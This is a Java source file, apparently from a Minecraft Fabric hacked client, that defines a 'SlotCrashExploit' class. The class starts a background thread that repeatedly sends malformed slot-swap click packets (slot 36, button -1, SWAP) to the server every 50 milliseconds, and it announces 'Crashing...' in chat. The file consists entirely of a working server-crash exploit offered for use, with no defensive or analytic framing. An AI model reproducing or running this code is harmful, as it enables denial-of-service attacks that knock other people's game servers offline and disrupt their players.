package tk.milkthedev.paradiseclientfabric.exploit.impl;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import tk.milkthedev.paradiseclientfabric.Helper;
import tk.milkthedev.paradiseclientfabric.exploit.Exploit;

public class SlotCrashExploit extends Exploit {
    public SlotCrashExploit() {
        super("slotcrash", "SlotSwap crash exploit");
    }

    @Override
    public void execute() {
        new Thread(() -> {
            Helper.printChatMessage("[CrashExploit] [SlotCrash] Crashing...");
            while (isRunning()) {
                for (int i = 0; i < 6; ++i) {
                    Int2ObjectArrayMap<ItemStack> map = new Int2ObjectArrayMap<>();
                    map.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                    assert MinecraftClient.getInstance().player != null;
                    MinecraftClient.getInstance().player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                            MinecraftClient.getInstance().player.currentScreenHandler.syncId,
                            MinecraftClient.getInstance().player.currentScreenHandler.getRevision(),
                            36,
                            -1,
                            SlotActionType.SWAP,
                            MinecraftClient.getInstance().player.currentScreenHandler.getCursorStack().copy(),
                            map
                    ));
                }

                try {
                    Thread.sleep(50);
                } catch (InterruptedException e) {
                    Helper.printChatMessage("[CrashExploit] [SlotCrash] Unable to sleep 50ms");
                }
            }
        }).start();
    }
}
